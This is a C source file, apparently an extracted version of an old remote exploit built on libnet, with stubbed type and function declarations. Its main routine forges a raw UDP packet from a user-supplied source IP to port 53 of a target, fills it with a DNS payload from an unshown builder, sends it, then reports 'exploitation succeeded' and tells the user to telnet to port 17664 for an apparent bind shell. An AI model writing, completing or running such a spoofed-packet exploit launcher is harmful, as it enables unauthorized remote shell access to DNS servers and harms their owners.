
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int u_long ;


 int DNS_H ;
 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 int IPPROTO_RAW ;
 int IPPROTO_UDP ;
 int IP_H ;
 int PRu16 ;
 int UDP_H ;
 unsigned int build_xp (unsigned char*) ;
 int exit (int ) ;
 int libnet_build_dns (int ,int,int,int ,int ,int ,unsigned char*,unsigned int,unsigned char*) ;
 int libnet_build_ip (int,int ,int,int ,int,int ,int ,int ,int *,int ,unsigned char*) ;
 int libnet_build_udp (int ,int,int *,int ,unsigned char*) ;
 int libnet_close_raw_sock (int) ;
 int libnet_do_checksum (unsigned char*,int ,int) ;
 int libnet_get_prand (int ) ;
 int libnet_name_resolve (char*,int ) ;
 int libnet_open_raw_sock (int ) ;
 int libnet_write_ip (int,unsigned char*,int) ;
 int perror (char*) ;
 int printf (char*,...) ;

int
main (int argc, char *argv[])
{
 int sock;
 u_long src_ip,
   dst_ip;

 unsigned char xpbuf[512];
 unsigned char tpack[512];
 unsigned int pl_len;


 if (argc != 3) {
  printf ("usage: %s <source ip> <dest ip>\n\n", argv[0]);

  exit (EXIT_FAILURE);
 }

 sock = libnet_open_raw_sock (IPPROTO_RAW);
 if (sock == -1) {
  perror ("libnet_open_raw_sock");
  exit (EXIT_FAILURE);
 }

 src_ip = libnet_name_resolve (argv[1], 0);
 dst_ip = libnet_name_resolve (argv[2], 0);

 pl_len = build_xp (xpbuf);

 libnet_build_ip (UDP_H + DNS_H + pl_len, 0, 7350, 0, 2, IPPROTO_UDP,
  src_ip, dst_ip, ((void*)0), 0, tpack);
 libnet_build_udp (libnet_get_prand (PRu16), 53, ((void*)0), 0,
  tpack + IP_H);
 libnet_build_dns (libnet_get_prand (PRu16), 0x0000, 1, 0, 0, 0,
  xpbuf, pl_len, tpack + IP_H + UDP_H);
 libnet_do_checksum (tpack, IPPROTO_UDP, UDP_H + DNS_H + pl_len);



 libnet_write_ip (sock, tpack, UDP_H + IP_H + DNS_H + pl_len);
 libnet_close_raw_sock (sock);

 printf ("exploitation succeeded.\n");
 printf ("try: \"telnet %s 17664\" now.\n", argv[2]);

 exit (EXIT_SUCCESS);
}
